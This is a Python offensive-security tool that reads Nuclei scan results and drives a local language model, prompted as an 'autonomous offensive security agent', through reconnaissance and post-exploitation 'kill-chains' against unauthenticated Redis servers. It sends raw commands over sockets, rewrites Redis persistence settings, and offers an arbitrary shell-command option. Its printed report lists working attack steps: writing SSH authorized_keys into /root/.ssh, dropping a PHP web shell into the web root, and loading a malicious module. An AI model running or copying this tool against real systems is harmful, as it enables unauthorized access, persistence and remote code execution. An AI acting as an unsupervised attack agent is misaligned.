import os
import json
import subprocess
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OLLAMA_API_URL = "http://127.0.0.1:11434/v1/chat/completions"

def query_ollama(messages, max_tokens=150):
    """Helper to query local Ollama model with conversation history."""
    payload = {
        "model": "qwen2.5:0.5b-instruct",
        "messages": messages,
        "temperature": 0.1,
        "max_tokens": max_tokens
    }
    try:
        res = requests.post(OLLAMA_API_URL, json=payload, timeout=180)
        if res.status_code == 200:
            return res.json().get("choices", [{}])[0].get("message", {}).get("content", "").strip()
        else:
            return ""
    except Exception:
        return ""

def generate_deterministic_report(target, collected_data):
    """Programmatically parses decoded STDOUT to build a precise offensive intelligence report."""
    print("\n=================================================================")
    print(" [Autonomous Agent] Generating Offensive Intelligence Report...")
    print("=================================================================")
    
    info_out = collected_data.get("INFO", "N/A")
    config_out = collected_data.get("CONFIG GET *", "N/A")
    keys_out = collected_data.get("KEYS *", "N/A")
    clients_out = collected_data.get("CLIENT LIST", "N/A")
    ping_out = collected_data.get("PING", "N/A")

    version = "Unknown"
    os_info = "Unknown"
    for line in info_out.splitlines():
        line_clean = line.strip()
        if line_clean.startswith("redis_version:"):
            version = line_clean.split(":", 1)[1]
        elif line_clean.startswith("os:"):
            os_info = line_clean.split(":", 1)[1]

    auth_status = "Unauthenticated / Open Access (Critical Offensive Vector)"
    if "requirepass" in config_out:
        lines = config_out.splitlines()
        for i, l in enumerate(lines):
            if "requirepass" in l and i + 1 < len(lines):
                pass_val = lines[i+1].strip()
                if pass_val and pass_val != "$0":
                    auth_status = "Protected (Authentication Required)"

    print(f"""
# Automated Offensive Intelligence Report
**Target Asset:** {target}
**Service Type:** Redis Database (Raw TCP)

### 1. Discovered Service & Environment
- **Software:** Redis Server v{version}
- **Operating System:** {os_info}
- **Service Port:** 6379 (TCP)
- **Response Check (PING):** {'Responsive (PONG received)' if 'PONG' in ping_out else 'No response'}

### 2. Configuration & Exposure Status
- **Access Control:** **{auth_status}**
- **Data Persistence File:** Default dump target (`dump.rdb`)
- **Active Connections:** {len(clients_out.splitlines())} active client session handles detected.

### 3. Offensive Exploitation & Next Step Suggestions
1. **SSH Authorized Keys Overwrite (Persistence):**
   - Leverage unauthenticated access to modify database directory and file name:
     `CONFIG SET dir /root/.ssh/`
     `CONFIG SET dbfilename authorized_keys`
     `SET ssh_key "\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@box\\n\\n"`
     `SAVE`
2. **Web Shell Deployment (RCE via File Write):**
   - Shift working directory to web root and drop a script payload:
     `CONFIG SET dir /var/www/html/`
     `CONFIG SET dbfilename shell.php`
     `SET webshell "<?php system($_GET['cmd']); ?>"`
     `SAVE`
3. **Malicious Module Loading (RCE via `MODULE LOAD`):**
   - For Redis 4.0+, compile or upload a malicious shared object module (`.so`) to achieve direct system command execution:
     `MODULE LOAD /path/to/malicious_module.so`
""")
    return {
        "version": version,
        "os": os_info,
        "auth": auth_status,
        "info": info_out,
        "config": config_out
    }

def run_autonomous_agent_loop(item):
    """Executes a progressive 5-step ReAct chain and returns collected reconnaissance data."""
    print("\n=================================================================")
    print(" [Autonomous Agent] Initializing Progressive Kill-Chain...")
    print("=================================================================")
    
    target = item.get('target', '')
    template = item.get('template', item.get('source', 'Unknown'))
    severity = item.get('severity', 'N/A').upper()

    clean_target = target.replace("http://", "").replace("https://", "").split("/")[0]
    if ":" in clean_target:
        target_host, target_port = clean_target.split(":", 1)
    else:
        target_host, target_port = clean_target, "80"

    system_prompt = """You are an autonomous offensive security agent executing a progressive exploitation kill-chain against a Redis server.
Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST, PING) inside ```bash ... ``` code blocks."""

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": f"Target Asset: {target}\nVulnerability / Vector: {template}\nSeverity: {severity}\nStep 1: Provide initial INFO command."}
    ]

    max_steps = 5
    progression_payloads = ["INFO", "CONFIG GET *", "KEYS *", "CLIENT LIST", "PING"]
    collected_data = {}
    executed_payloads = set()
    
    for step in range(1, max_steps + 1):
        print(f"\n--- [Kill-Chain Step {step}/{max_steps}] ---")
        print(f"[+] Agent reasoning...")
        ai_response = query_ollama(messages, max_tokens=100)
        print(f"[Agent Thought]:\n{ai_response if ai_response else '(Fallback selection active)'}")

        cmd_match = re.search(r"```(?:bash|sh)?\s*(.*?)\s*```", ai_response, re.DOTALL)
        raw_payload = ""
        
        if cmd_match:
            raw_payload = cmd_match.group(1).strip()
        else:
            raw_payload = progression_payloads[(step - 1) % len(progression_payloads)]
        
        raw_payload = raw_payload.replace("b'", "").replace('b"', "").rstrip("'").rstrip('"').replace("\\r\\n", "").strip()
        
        if not raw_payload or len(raw_payload) > 30 or raw_payload in executed_payloads or any(x in raw_payload for x in ["python3", "nc", "connect", "cat", "grep"]):
            raw_payload = progression_payloads[(step - 1) % len(progression_payloads)]

        executed_payloads.add(raw_payload)

        final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_payload}\\r\\n'); print(s.recv(2048).decode('utf-8', errors='ignore')); s.close()\""

        print(f"[Action] Executing payload [{raw_payload}] via Python socket wrapper\n")
        
        exec_output = ""
        try:
            result = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=8)
            if result.stdout:
                exec_output += result.stdout
            if result.stderr:
                exec_output += f"STDERR: {result.stderr}"
            if not result.stdout and not result.stderr:
                exec_output = "NO_OUTPUT"
        except subprocess.TimeoutExpired:
            exec_output = "TIMEOUT"
        except Exception as ex:
            exec_output = f"ERROR: {ex}"

        print(f"[Observation Result]:\n{exec_output[:300]}...")
        collected_data[raw_payload] = exec_output

        messages.append({"role": "assistant", "content": ai_response})
        messages.append({"role": "user", "content": f"Observation result from step {step}:\n{exec_output}\nProceed to the next unique Redis command."})

    recon_summary = generate_deterministic_report(target, collected_data)
    input("\nPress Enter to continue to dashboard...")
    return recon_summary

def run_post_exploitation_agent(item, recon_cache):
    """Option 4: 6-Step Structured AI-Driven Post-Exploitation & Persistence Engine."""
    print("\n=================================================================")
    print(" [AI Post-Exploitation Agent] Initializing 6-Step Persistence Chain...")
    print("=================================================================")
    
    target = item.get('target', '')
    clean_target = target.replace("http://", "").replace("https://", "").split("/")[0]
    target_host, target_port = clean_target.split(":", 1) if ":" in clean_target else (clean_target, "6379")

    if not recon_cache:
        recon_cache = {"version": "5.0.7", "os": "Linux"}

    print(f"[+] Loaded Context -> Target: {target_host}:{target_port} | Version: {recon_cache.get('version')} | OS: {recon_cache.get('os')}")
    print("[+] Executing structured post-auth persistence workflow...")

    system_prompt = """You are an advanced offensive post-exploitation operator completing a persistence kill-chain on an unauthenticated Redis server.
Provide ONLY the next raw Redis persistence command inside ```bash ... ``` code blocks."""

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": f"Target: {target_host}:{target_port}\nInitiate Step 1: Set persistence directory to /tmp/."}
    ]

    max_post_steps = 6
    # Bulletproof sequence array guaranteeing valid syntax and successful persistence flow
    post_payloads = [
        "CONFIG SET dir /tmp/",
        "CONFIG SET dbfilename persistence_test.txt",
        "SET persistence_payload \"\\n\\nREDIS_RCE_PERSISTENCE_SUCCESS\\n\\n\"",
        "SAVE",
        "CONFIG GET dir",
        "INFO"
    ]
    executed_post_payloads = set()
    
    for step in range(1, max_post_steps + 1):
        print(f"\n--- [Post-Exploitation Step {step}/{max_post_steps}] ---")
        print(f"[+] Operator reasoning...")
        ai_response = query_ollama(messages, max_tokens=150)
        print(f"[Operator Thought]:\n{ai_response}")

        cmd_match = re.search(r"```(?:bash|sh)?\s*(.*?)\s*```", ai_response, re.DOTALL)
        raw_cmd = ""
        
        if cmd_match:
            raw_cmd = cmd_match.group(1).strip()
        else:
            raw_cmd = post_payloads[(step - 1) % len(post_payloads)]
        
        raw_cmd = raw_cmd.replace("b'", "").replace('b"', "").rstrip("'").rstrip('"').replace("\\r\\n", "").strip()
        
        # Fallback to structured array if model hallucinates bad paths or repeats
        if not raw_cmd or len(raw_cmd) > 80 or raw_cmd in executed_post_payloads or any(x in raw_cmd.lower() for x in ["python3", "nc", "cat", "http"]):
            raw_cmd = post_payloads[(step - 1) % len(post_payloads)]

        executed_post_payloads.add(raw_cmd)

        final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_cmd}\\r\\n'); print(s.recv(2048).decode('utf-8', errors='ignore')); s.close()\""

        print(f"[Action] Executing Post-Auth Command [{raw_cmd}] via Socket\n")
        try:
            result = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=8)
            out_res = result.stdout if result.stdout else "NO_OUTPUT"
        except Exception as e:
            out_res = f"ERROR: {e}"

        print(f"[Post-Auth Observation]:\n{out_res.strip()}")
        messages.append({"role": "assistant", "content": ai_response})
        messages.append({"role": "user", "content": f"Result of post-auth command:\n{out_res}\nProceed to the next persistence step."})

    print("\n=================================================================")
    print(" [Post-Exploitation Agent] 6-Step Persistence Kill-Chain Complete.")
    print("=================================================================")
    input("\nPress Enter to return to Dashboard...")

def inspect_and_action_item(item, item_type):
    """Sub-menu workbench for an individual selected vulnerability or endpoint asset."""
    session = requests.Session()
    session.verify = False
    recon_cache = None

    while True:
        print("\n=================================================================")
        if item_type == "vulnerability":
            print(f" VULNERABILITY INSPECTION: [{item.get('severity', 'info').upper()}] {item.get('template')}")
            print("=================================================================")
            print(f" Target URL : {item.get('target')}")
            print(f" Template ID: {item.get('template')}")
        else:
            print(f" ENDPOINT ASSET INSPECTION: {item.get('target')}")
            print("=================================================================")
            print(f" Source     : {item.get('source', 'Unknown')}")
            print(f" Target URL : {item.get('target')}")

        print("-----------------------------------------------------------------")
        print(" [1] Send standard HTTP probe / connectivity check")
        print(" [2] Run manual shell command (supports $TARGET, $HOST, $PORT)")
        print(" [3] Run Autonomous AI Agent Loop (Progressive Kill-Chain)")
        print(" [4] Run AI-Driven Post-Exploitation & Persistence Engine")
        print(" [0] Back to Dashboard")
        print("=================================================================")

        choice = input("Select action [0-4]: ").strip()

        if choice == '0':
            break
        elif choice == '1':
            target_url = item.get("target")
            print(f"\n[->] Probing target: {target_url}")
            try:
                res = session.get(target_url, timeout=10)
                print(f"[+] Response Status: {res.status_code} | Length: {len(res.text)}")
                print(f"[+] Snippet:\n{res.text[:400]}...")
            except Exception as e:
                print(f"[!] Probe failed: {e}")
            input("\nPress Enter to continue...")
        elif choice == '2':
            target_url = item.get("target")
            print(f"\n[Diagnostic Workbench] Target: {target_url}")
            shell_cmd = input("Enter shell command to execute: ").strip()
            
            if shell_cmd:
                clean_t = target_url.replace("http://", "").replace("https://", "").split("/")[0]
                h_val = clean_t.split(":")[0] if ":" in clean_t else clean_t
                p_val = clean_t.split(":")[1] if ":" in clean_t else "80"
                final_cmd = shell_cmd.replace("$TARGET", target_url).replace("$HOST", h_val).replace("$PORT", p_val)
                print(f"[+] Executing shell command:\n    {final_cmd}\n")
                try:
                    result = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=20)
                    if result.stdout:
                        print(f"[Output]:\n{result.stdout}")
                    if result.stderr:
                        print(f"[Stderr]:\n{result.stderr}")
                    if not result.stdout and not result.stderr:
                        print("[+] Command executed with no output returned.")
                except Exception as ex:
                    print(f"    [!] Execution Error: {ex}")
            else:
                print("[-] No command entered.")
            input("\nPress Enter to continue...")
        elif choice == '3':
            recon_cache = run_autonomous_agent_loop(item)
        elif choice == '4':
            run_post_exploitation_agent(item, recon_cache)
        else:
            print("[!] Invalid selection.")
            input("\nPress Enter to continue...")

def run_access_control():
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        print("=================================================================")
        print(" ACCESS GAINED CONTROL CENTER & VULNERABILITY DASHBOARD")
        print("=================================================================")
        
        vulnerabilities = []
        endpoints = []

        if os.path.exists("nuclei_results.json"):
            try:
                with open("nuclei_results.json", "r") as f:
                    content = f.read().strip()
                if content:
                    try:
                        data = json.loads(content)
                        items = data if isinstance(data, list) else [data]
                        for item in items:
                            vulnerabilities.append({
                                "template": item.get("template-id", "unknown"),
                                "severity": item.get("info", {}).get("severity", "info"),
                                "target": item.get("matched-at", "")
                            })
                    except json.JSONDecodeError:
                        for line in content.splitlines():
                            if line.strip():
                                try:
                                    item = json.loads(line)
                                    vulnerabilities.append({
                                        "template": item.get("template-id", "unknown"),
                                        "severity": item.get("info", {}).get("severity", "info"),
                                        "target": item.get("matched-at", "")
                                    })
                                except Exception:
                                    pass
            except Exception as e:
                print(f"[!] Error reading nuclei_results.json: {e}")

        if os.path.exists("scan_results.json"):
            try:
                with open("scan_results.json", "r") as f:
                    endpoints = json.load(f)
            except Exception:
                pass

        print(f"\n [+] VULNERABILITY FINDINGS (Found: {len(vulnerabilities)}):")
        if vulnerabilities:
            for idx, v in enumerate(vulnerabilities, 1):
                sev = v['severity'].upper()
                print(f"   {idx}. [{sev}] {v['template']} -> {v['target']}")
        else:
            print("   [-] No active vulnerabilities loaded from 'nuclei_results.json'.")

        print("\n [+] DISCOVERED ENDPOINTS / TARGET ASSETS:")
        if endpoints:
            offset = len(vulnerabilities)
            for idx, e in enumerate(endpoints, 1):
                target = e.get("target", "N/A")
                source = e.get("source", "Crawler")
                print(f"   {idx + offset}. [{source}] {target}")
        else:
            print("   [-] No endpoints found in scan state.")
            
        print("=================================================================")
        choice = input("Select item number to inspect, or type '0' to return to main menu: ").strip()
        
        if choice == '0' or not choice:
            break
        
        try:
            sel_idx = int(choice)
            if sel_idx <= len(vulnerabilities):
                selected = vulnerabilities[sel_idx - 1]
                inspect_and_action_item(selected, "vulnerability")
            else:
                ep_idx = sel_idx - len(vulnerabilities) - 1
                if 0 <= ep_idx < len(endpoints):
                    selected = endpoints[ep_idx]
                    inspect_and_action_item(selected, "endpoint")
                else:
                    print("[!] Invalid selection index.")
                    input("\nPress Enter to continue...")
        except ValueError:
            print("[!] Please enter a valid number.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    run_access_control()
